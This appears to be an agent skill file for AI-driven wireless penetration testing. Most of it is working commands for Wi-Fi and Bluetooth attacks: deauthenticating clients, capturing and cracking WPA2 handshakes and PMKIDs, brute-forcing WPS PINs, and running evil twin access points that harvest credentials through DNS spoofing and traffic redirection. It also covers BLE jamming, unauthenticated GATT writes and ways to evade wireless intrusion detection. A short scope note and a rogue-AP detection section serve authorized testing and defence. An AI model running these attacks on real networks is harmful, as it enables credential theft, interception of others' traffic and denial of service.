# Wireless Attacker

Wireless network security — WPA/WPA3 handshake capture and cracking, PMKID attacks, WPS Pixie Dust, evil twin with hostapd/dnsmasq, Bluetooth LE testing with bettercap, and rogue AP detection.

## Tags
offensive, wireless, WiFi, Bluetooth

## Triggers
wireless, WiFi, WPA, WPA3, PMKID, WPS, Pixie Dust, evil twin, Bluetooth, BLE, aircrack, rogue AP

## Recommended Model
sonnet

---
## Cybersecurity Skills (Invoke First)

Before starting wireless testing, invoke these skills via the Skill tool:
- `cybersecurity-skills:conducting-wireless-network-penetration-test`
- `cybersecurity-skills:performing-wifi-password-cracking-with-aircrack`
- `cybersecurity-skills:performing-wireless-security-assessment-with-kismet`
- `cybersecurity-skills:performing-bluetooth-security-assessment`
- `cybersecurity-skills:detecting-bluetooth-low-energy-attacks`
- `cybersecurity-skills:performing-wireless-network-penetration-test`

## Scope Enforcement
Verify wireless networks (SSID/BSSID) and physical location are authorized in scope.txt.
Wireless attacks affect all clients on the segment — confirm authorization explicitly.
Deauthentication affects ALL clients on target AP — use targeted (-c $CLIENT_MAC) when possible.

## Interface Setup
```bash
# List wireless interfaces
iw dev
iwconfig

# Enable monitor mode
airmon-ng check kill        # kill conflicting processes
airmon-ng start wlan0       # creates wlan0mon (or similar)
iw dev                      # verify mon interface is up
iwconfig wlan0mon           # confirm mode=Monitor

# Verify monitor mode
tcpdump -i wlan0mon -e -n type mgt 2>/dev/null | head -10

# Set channel (for targeted capture)
iwconfig wlan0mon channel $CHANNEL
# OR
iw dev wlan0mon set channel $CHANNEL

# Stop monitor mode when done
airmon-ng stop wlan0mon
service NetworkManager start
```

## Network Discovery
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/wireless/{captures,hashes,logs}

# Passive scan — discover all APs and clients
airodump-ng wlan0mon 2>&1

# Save discovery output
airodump-ng wlan0mon \
  --write evidence/$(date +%Y%m%d)/$TARGET/wireless/discovery \
  --output-format csv,kismet \
  2>&1 &
sleep 60 && kill %1

# Parse discovered networks
cat evidence/$(date +%Y%m%d)/$TARGET/wireless/discovery-01.csv | \
  head -30 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/networks.txt
```

## WPA2 Handshake Capture
```bash
# Target a specific network — capture handshake
airodump-ng wlan0mon \
  --channel $CHANNEL \
  --bssid $BSSID \
  --write evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture \
  --output-format pcap \
  2>&1 &

# Deauthentication attack — force client to reconnect (generates handshake)
# Targeted (single client — less disruptive):
aireplay-ng -0 5 -a $BSSID -c $CLIENT_MAC wlan0mon 2>&1

# Broadcast deauth (all clients — more disruptive):
aireplay-ng -0 10 -a $BSSID wlan0mon 2>&1

# Wait for handshake — look for "WPA handshake: $BSSID" in airodump output
# Check captured pcap
aircrack-ng evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01.cap 2>&1 | \
  grep "handshake\|BSSID"

# Convert to hashcat format (HCCAPX)
hcxpcapngtool \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/handshake.hc22000 \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01.cap 2>&1

# Crack with hashcat
hashcat -m 22000 \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/handshake.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/wpa2_cracked.txt 2>&1

# Crack with aircrack-ng (slower)
aircrack-ng \
  -w /usr/share/wordlists/rockyou.txt \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01.cap 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/aircrack_result.txt
```

## PMKID Attack (Clientless WPA2 Cracking)
```bash
# Capture PMKID — does NOT need client (faster than handshake method)
hcxdumptool \
  -i wlan0mon \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/pmkid.pcapng \
  --enable_status=3 \
  --filterlist_ap=$BSSID \
  --filtermode=2 \
  2>&1 &

sleep 120 && kill %1  # run for 2 minutes

# Convert to hashcat format
hcxpcapngtool \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/pmkid.hc22000 \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/pmkid.pcapng 2>&1

# Crack PMKID
hashcat -m 22000 \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/pmkid.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/pmkid_cracked.txt 2>&1
```

## WPS PIN Attack
```bash
# Check for WPS on AP
wash -i wlan0mon -C 2>&1 | grep $BSSID | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/wps_scan.txt

# WPS PIN brute force with Reaver
reaver \
  -i wlan0mon \
  -b $BSSID \
  -c $CHANNEL \
  -vv \
  --no-associate \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/reaver.log \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/reaver_console.txt

# PixieDust attack (WPS offline PIN attack — faster)
reaver \
  -i wlan0mon \
  -b $BSSID \
  -c $CHANNEL \
  -K 1 \
  -vv \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/pixiedust.txt

# Bully alternative
bully wlan0mon -b $BSSID -d -v 3 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/bully.txt
```

## Evil Twin / Rogue AP
```bash
# hostapd-wpe — enterprise EAP credential capture
# Edit hostapd-wpe.conf with target SSID
cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/hostapd-wpe-custom.conf
sed -i "s/^ssid=.*/ssid=$TARGET_SSID/" /tmp/hostapd-wpe-custom.conf
sed -i "s/^channel=.*/channel=$CHANNEL/" /tmp/hostapd-wpe-custom.conf
sed -i "s/^interface=.*/interface=wlan1/" /tmp/hostapd-wpe-custom.conf

# Launch rogue AP (use second wireless interface)
hostapd-wpe /tmp/hostapd-wpe-custom.conf 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/hostapd_wpe.log &

# Simultaneously deauth clients from legitimate AP
aireplay-ng -0 0 -a $BSSID wlan0mon 2>&1 &

# Monitor for captured credentials
tail -f evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/hostapd_wpe.log | \
  grep -E "MSCHAPV2|EAP|username|password|NTHash" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/eap_credentials.txt

# Kill rogue AP and deauth when done
kill %1 %2
```

## EAP/PEAP Credential Cracking
```bash
# After capturing EAP credentials via hostapd-wpe
# Extract MSCHAPv2 challenge/response pairs from log
grep -A 5 "MSCHAPV2" \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/logs/hostapd_wpe.log | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/mschapv2.txt

# Crack MSCHAPv2 with asleap
asleap \
  -C $CHALLENGE \
  -R $RESPONSE \
  -W /usr/share/wordlists/rockyou.txt 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/asleap_cracked.txt

# hashcat mode 5500 (NetNTLMv1) or 5600 (NetNTLMv2)
# Format from hostapd-wpe: username::domain:challenge:response:response
hashcat -m 5500 \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/mschapv2_hashcat.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/wireless/hashes/mschapv2_cracked.txt 2>&1
```

## Bluetooth Assessment
```bash
# Scan for Bluetooth devices
hciconfig hci0 up
hcitool scan 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/bluetooth_devices.txt
hcitool lescan 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/ble_devices.txt &
sleep 30 && kill %1

# Bluetoothctl for detailed enumeration
echo -e "power on\nagent on\ndefault-agent\nscan on" | \
  timeout 30 bluetoothctl 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/wireless/bt_scan.txt

# BLE scanning with gatttool
gatttool -b $BT_MAC -I 2>&1

# Wireshark/btlejack for BLE sniffing (requires Micro:bit hardware)
# btlejack -s  # sniff all BLE traffic

# Bleah for BLE enumeration (Python)
bleah -t 30 -s 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/ble_scan.txt || \
  echo "[!] bleah not installed — use bettercap for BLE"

# Bettercap BLE enumeration
# bettercap -caplet ble-recon.cap
echo "ble.recon on; ticker off; ble.show" | \
  bettercap 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/bettercap_ble.txt
```

## Traffic Analysis (Post-Capture)
```bash
# Decrypt captured WPA2 traffic in Wireshark (GUI)
# Wireshark → Edit → Preferences → Protocols → IEEE 802.11
# Add PSK: $CRACKED_PASSWORD, SSID: $TARGET_SSID

# Decrypt with airdecap-ng (CLI)
airdecap-ng \
  -p $CRACKED_PASSWORD \
  -e "$TARGET_SSID" \
  evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01.cap \
  2>&1

# Analyze decrypted pcap
tshark \
  -r evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01-dec.cap \
  -Y "http || dns || smtp" \
  -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.host -e dns.qry.name \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/decrypted_traffic.txt
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/wireless/wireless_findings.md`:
```markdown
## Wireless Assessment — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Networks Discovered
| SSID | BSSID | Channel | Encryption | WPS | Clients |
|------|-------|---------|------------|-----|---------|

### Attack Results
| Attack | Target SSID | Outcome | Password/Hash Location |
|--------|-------------|---------|----------------------|

### Captured Credentials
| Type | Account | Hash Location (NO PLAINTEXT) |
|------|---------|------------------------------|

### Bluetooth/BLE
| Device | MAC | Name | Vulnerabilities |
|--------|-----|------|-----------------|

## WPA/WPA3 Protocol Deep Dive

### WPA2 4-Way Handshake Analysis
```bash
# Capture and analyze the complete 4-way handshake
# The handshake occurs when a client connects to the AP
# Frames 1-4 of the EAPOL-Key exchange contain the key material

tshark \
  -r evidence/$(date +%Y%m%d)/$TARGET/wireless/captures/wpa2_capture-01.cap \
  -Y "eapol" \
  -T fields \
  -e frame.number \
  -e wlan.sa \
  -e wlan.da \
  -e eapol.msg_no \
  -e eapol.key.info.key_ack \
  -e eapol.key.info.key_mic \
  -e eapol.key.nonce \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/analysis/eapol_frames.txt

# Verify PMKID in first EAPOL frame (Frame 1 key Ack flag = 1)
# PMKID = HMAC-SHA1(PMK, "PMK Name" | AP MAC | STA MAC)
# Some APs include PMKID in the first EAPOL frame — enables offline attack without handshake
grep "eapol.msg_no == 1" evidence/$(date +%Y%m%d)/$TARGET/wireless/analysis/eapol_frames.txt
```

### WPA3-SAE Analysis
```bash
# WPA3 uses Simultaneous Authentication of Equals (SAE)
# No offline dictionary attack possible — brute force requires online interaction

# Identify WPA3 networks (Management frame protection required)
airodump-ng wlan0mon --bssid $BSSID --write /tmp/wpa3_capture -c $CHANNEL &
sleep 30 && kill %1

# Check for WPA3 indicators
# - RSN IE with AKM: SAE (0x000AC)
# - RSN IE with AKM: SAE-EXT-KEY (0x000AD) for WPA3-Enterprise
# - MFP (Management Frame Protection) required

tshark -r /tmp/wpa3_capture-01.cap \
  -Y "wlan.rsn.akm.sae || wlan.rsn.akm.sae_ext_key" \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/wireless/analysis/wpa3_check.txt

# WPA3 transition mode (WPA2+WPA3) — targets the WPA2 fallback
# APs often support both — look for RSN IE with both PSK and SAE AKMs
# The WPA2 side is still vulnerable to traditional attacks

# Dragonblood vulnerabilities (CVE-2019-9494, CVE-2019-9495, CVE-2019-9496, CVE-2019-9497, CVE-2019-9498)
# SAE downgrade, side-channel leaks on password conversion
# Test with: https://github.com/vanhoefm/dragonblood
```

### WPA3-Enterprise (EAP-TLS/PWD) Assessment
```bash
# WPA3-Enterprise uses EAP-TLS (certificate-based) or EAP-PWD
# Focus on: certificate validation, EAP-PWD timing attacks, downgrade to WPA2-Enterprise

# Test EAP-PWD for timing side-channel (CVE-2019-9495)
# Requires specialized tooling
# Reference: dragonblood project

# Check if AP allows downgrade to WPA2-Enterprise
# If so, traditional credential attacks apply (hostapd-wpe for EAP capture)
```

## Evil Twin: Complete Setup with hostapd + dnsmasq

### Infrastructure Setup
```bash
ETDIR=evidence/$(date +%Y%m%d)/$TARGET/wireless/evil_twin
mkdir -p $ETDIR

# Step 1: Create hostapd configuration
# Copy target AP's exact SSID, channel, and security settings
cat > $ETDIR/hostapd.conf << 'HOSTAPD'
interface=wlan1          # Second wireless adapter for rogue AP
driver=nl80211
ssid=TARGET_SSID         # Must match legitimate AP exactly
channel=$CHANNEL
hw_mode=g                # 2.4GHz; hw_mode=a for 5GHz
ieee80211n=1             # Enable 802.11n (match target)
wmm_enabled=1
macaddr_acl=0            # No MAC filtering
auth_algs=1
ignore_broadcast_ssid=0  # Visible SSID

# WPA2-PSK configuration (must match target for seamless association)
wpa=2
wpa_passphrase=EvilTwinTest123  # Can be any password — clients will auto-connect if saved
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
HOSTAPD

# Step 2: Create dnsmasq configuration (DHCP + DNS)
cat > $ETDIR/dnsmasq.conf << 'DNSMASQ'
# DHCP configuration
interface=wlan1
bind-interfaces
server=8.8.8.8           # Forward DNS queries upstream
listen-address=10.0.0.1
dhcp-range=10.0.0.10,10.0.0.250,12h

# DNS spoofing — redirect specific domains to our server
address=/login.target.com/10.0.0.1
address=/ captive.target.com/10.0.0.1
address=/account.target.com/10.0.0.1

# Log all DNS queries
log-queries
log-facility=/tmp/dnsmasq.log
DNSMASQ

# Step 3: Configure network interface
ip link set wlan1 down
ip addr flush dev wlan1
ip addr add 10.0.0.1/24 dev wlan1
ip link set wlan1 up

# Step 4: Enable IP forwarding (route traffic through attacker)
sysctl -w net.ipv4.ip_forward=1

# Step 5: Start evil twin infrastructure
hostapd -d $ETDIR/hostapd.conf > $ETDIR/hostapd.log 2>&1 &
sleep 2
dnsmasq -C $ETDIR/dnsmasq.conf > $ETDIR/dnsmasq.log 2>&1 &

# Step 6: Set up traffic redirection
# Redirect HTTP traffic to credential capture page
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:443
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Step 7: Start captive portal / credential harvester
# Using a simple Python HTTP server with credential capture page
python3 -m http.server 80 --directory $ETDIR/portal/ &

# Step 8: Simultaneously deauth clients from legitimate AP
# Use FIRST adapter (wlan0mon) for deauth
aireplay-ng -0 5 -a $BSSID -c $CLIENT_MAC wlan0mon 2>&1 | tee $ETDIR/deauth.log &

# Step 9: Monitor for connected clients on evil twin
dnsmasq --keep-in-foreground --log-queries 2>&1 | tee $ETDIR/dhcp_leases.log &

# Cleanup when done
# kill %1 %2 %3 %4
# iptables -t nat -F
# sysctl -w net.ipv4.ip_forward=0
# ip addr flush dev wlan1
# ip link set wlan1 down
```

## PMKID Attack: Advanced Techniques

### hcxdumptool + hcxtools Full Pipeline
```bash
HCXDIR=evidence/$(date +%Y%m%d)/$TARGET/wireless/pmkid
mkdir -p $HCXDIR

# Method 1: hcxdumptool (recommended — faster, more reliable)
# Uses PMKID discovery via EAPOL request frames
timeout 300 hcxdumptool \
  -i wlan0mon \
  -o $HCXDIR/capture.pcapng \
  --enable_status=15 \
  --filterlist_ap=$BSSID \
  --filtermode=2 \
  --rcv_client_limit=0 \
  --disable_deauthentication \
  2>&1 | tee $HCXDIR/hcxdumptool.log

# Convert to hashcat format (PMKID = 22000, EAPOL = 22000)
hcxpcapngtool \
  -o $HCXDIR/hash.hc22000 \
  $HCXDIR/capture.pcapng 2>&1 | tee $HCXDIR/hcxpcapngtool.log

# Also extract EAPOL handshakes if captured
hcxpcapngtool \
  -o $HCXDIR/eapol.hc22000 \
  -E $HCXDIR/identity_hashes.hc22000 \
  $HCXDIR/capture.pcapng 2>&1

# Method 2: hcxdumptool passive mode (no deauth at all)
timeout 600 hcxdumptool \
  -i wlan0mon \
  -o $HCXDIR/passive_capture.pcapng \
  --enable_status=15 \
  --disable_client_attacks \
  --disable_deauthentication \
  2>&1 | tee $HCXDIR/passive_hcxdumptool.log

# Check what was captured
hcxpcapngtool $HCXDIR/capture.pcapng 2>&1 | tee $HCXDIR/capture_summary.txt
echo "[*] Hashes captured:"
wc -l $HCXDIR/hash.hc22000 2>/dev/null

# Method 3: pmkid_client (alternative tool)
pmkid_client -i wlan0mon -b $BSSID -c $CHANNEL 2>&1 | tee $HCXDIR/pmkid_client.log
```

### Hashcat Cracking Optimization
```bash
# PMKID cracking (hashcat mode 22000)
# Rule-based attack (best for common passwords)
hashcat -m 22000 $HCXDIR/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o $HCXDIR/cracked.txt 2>&1 | tee $HCXDIR/hashcat_best64.log

# Aggressive rules (slower, more coverage)
hashcat -m 22000 $HCXDIR/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule \
  --force \
  -o $HCXDIR/cracked_d3ad0ne.txt 2>&1 | tee $HCXDIR/hashcat_d3ad0ne.log

# Mask attack (if you know password pattern)
# Example: 8-char lowercase + digits (common IoT default)
hashcat -m 22000 $HCXDIR/hash.hc22000 \
  -a 3 '?l?l?l?l?l?l?l?l?d?d' \
  --force \
  -o $HCXDIR/cracked_mask.txt 2>&1

# Brute force all 8-char printable passwords (slow but thorough)
hashcat -m 22000 $HCXDIR/hash.hc22000 \
  -a 3 '?a?a?a?a?a?a?a?a' \
  --increment \
  --force \
  -o $HCXDIR/cracked_bruteforce.txt 2>&1
```

## WPS Pixie Dust Attack

### Advanced WPS Attack Configuration
```bash
WPSDIR=evidence/$(date +%Y%m%d)/$TARGET/wireless/wps
mkdir -p $WPSDIR

# Step 1: Enumerate WPS-capable APs
wash -i wlan0mon -C 2>&1 | tee $WPSDIR/wps_enum.txt

# Key fields: WPS version, locked status, vendor, model
# Locked WPS = Pixie Dust won't work (AP rate-limited after too many attempts)
# Model/vendor helps identify known default PINs

# Step 2: Pixie Dust attack (offline — faster if vulnerable)
# Works by exploiting weak PRNG in EAPOL nonce generation
reaver \
  -i wlan0mon \
  -b $BSSID \
  -c $CHANNEL \
  -K \
  -vv \
  -f \
  -d 2 \
  2>&1 | tee $WPSDIR/pixiedust.log

# Step 3: If Pixie fails, try brute force (slower)
reaver \
  -i wlan0mon \
  -b $BSSID \
  -c $CHANNEL \
  -vv \
  -f \
  -d 5 \
  -t 5 \
  -L \
  2>&1 | tee $WPSDIR/bruteforce.log

# Step 4: Known WPS PIN databases
# Some vendors use predictable or static WPS PINs
# Check: https://github.com/dryg/huawei-wps-pin-generator

# Step 5: Bully (alternative to Reaver)
bully \
  -b $BSSID \
  -c $CHANNEL \
  -d \
  -v 3 \
  2>&1 | tee $WPSDIR/bully.log

# Step 6: After obtaining WPS PIN — derive PSK
reaver -i wlan0mon -b $BSSID -p $WPS_PIN 2>&1 | tee $WPSDIR/psk_derivation.log
```

## Bluetooth LE Testing with Bettercap

### BLE Reconnaissance
```bash
BTDIR=evidence/$(date +%Y%m%d)/$TARGET/wireless/ble
mkdir -p $BTDIR

# Bettercap BLE recon (comprehensive)
cat > $BTDIR/ble_scan.cap << 'CAP'
ble.recon on
set ble.show.advdata true
ble.show
cap

# Run bettercap with BLE caplet
echo "ble.recon on" | bettercap -eval "ble.show" 2>&1 | tee $BTDIR/ble_bettercap_recon.txt &
sleep 30 && kill %1

# Detailed BLE enumeration with bettercap
echo -e "ble.recon on\nset ble.show.rssi true\nble.show\nble.enum 00:11:22:33:44:55" | \
  bettercap 2>&1 | tee $BTDIR/ble_full_enum.txt

# BLE service enumeration for specific device
# GATT services may expose sensitive characteristics

# Test for unauthenticated GATT write characteristics
echo -e "ble.recon on\nble.enum $BT_MAC" | \
  bettercap 2>&1 | tee $BTDIR/ble_gatt_enum.txt
```

### BLE Security Testing
```bash
# Check for BLE pairing vulnerabilities
# - Legacy pairing (just works) — no MITM protection
# - Fixed PIN pairing — brute forceable
# - No bonding — no long-term key storage

# BLE sniffing with ubertooth (if hardware available)
ubertooth-scan 2>&1 | tee $BTDIR/ubertooth_scan.txt
ubertooth-sniff -t $BT_MAC 2>&1 | tee $BTDIR/ubertooth_sniff.txt

# BLE jamming / interference (for DoS testing)
# WARNING: Only test with explicit authorization
bettercap -eval "ble.recon on; ble.jam on" 2>&1 | tee $BTDIR/ble_jam_test.txt &
sleep 10 && kill %1

# BLE GATT write without authentication
# Test each discovered characteristic for write access
echo -e "ble.recon on\nble.write $BT_MAC $HANDLE $VALUE" | \
  bettercap 2>&1 | tee $BTDIR/ble_gatt_write.txt

# Capture BLE traffic and decode with Wireshark
# ubertooth-btle -f /tmp/ble_capture.pcap
# Analyze in Wireshark with BLE dissectors enabled
```

## Rogue AP Detection & Countermeasures

### Detecting Rogue APs in Environment
```bash
# Find all APs broadcasting the same SSID on different channels/BSSIDs
# This indicates potential evil twin
airodump-ng wlan0mon -w /tmp/ap_survey -C 10 --output-format csv 2>&1 &
sleep 60 && kill %1

# Parse and group by SSID
python3 << 'PYEOF'
import csv
from collections import defaultdict

aps = defaultdict(list)
with open('/tmp/ap_survey-01.csv') as f:
    reader = csv.reader(f)
    for row in reader:
        if len(row) > 14 and row[13]:  # Has SSID
            aps[row[13]].append({
                'bssid': row[0],
                'channel': row[3],
                'power': row[8],
                'encryption': row[5],
                'wps': row[7]
            })

print("[+] APs with duplicate SSIDs (potential evil twins):")
for ssid, entries in aps.items():
    if len(entries) > 1:
        print(f"\n  SSID: {ssid} ({len(entries)} instances)")
        for e in entries:
            print(f"    BSSID: {e['bssid']} CH: {e['channel']} Power: {e['power']} Enc: {e['encryption']} WPS: {e['wps']}")
PYEOF

# Check for BSSID spoofing (legitimate AP moved or evil twin)
# Compare against known-good MAC addresses
# Check OUI of BSSID — matches vendor of expected equipment?

# Signal strength analysis
# Evil twin typically has stronger signal (closer to victim)
# Or weaker signal (amplified to match legitimate AP)

# Channel anomaly detection
# Legitimate AP on channel 6, evil twin also on channel 6
# Or evil twin on adjacent channel to cause co-channel interference
```

### Detecting Client Forced Disconnects
```bash
# Monitor for deauthentication frames in the environment
# High rate = potential deauth attack in progress
tcpdump -i wlan0mon -e -n type mgt subtype deauth 2>&1 | \
  tee $BTDIR/deauth_monitor.log &

# Count deauth frames per second
# Normal: 0-2 per minute per AP
# Attack: 10-100+ per second
tshark -i wlan0mon \
  -Y "wlan.fc.type_subtype == 12" \
  -T fields \
  -e wlan.sa \
  -e wlan.da \
  -e frame.time_relative \
  2>&1 | tee $BTDIR/deauth_analysis.txt
```

### WIDS/WIPS Detection Evasion
```bash
# If the environment has wireless intrusion detection:
# 1. Use targeted deauth (-c MAC) instead of broadcast
# 2. Lower deauth rate (-D 1 for single deauth)
# 3. Use channel hopping to avoid sustained monitoring
# 4. Match the legitimate AP's beacon interval and capabilities exactly
# 5. Use the same BSSID (spoofed) to blend in

# Spoof MAC address on wlan1 for evil twin
ifconfig wlan1 hw ether $LEGIT_BSSID

# Reduce evil twin beacon rate to avoid detection
# In hostapd.conf: beacon_int=100 (default), increase to match target
# Lower beacon rate = less conspicuous but slower client migration
```

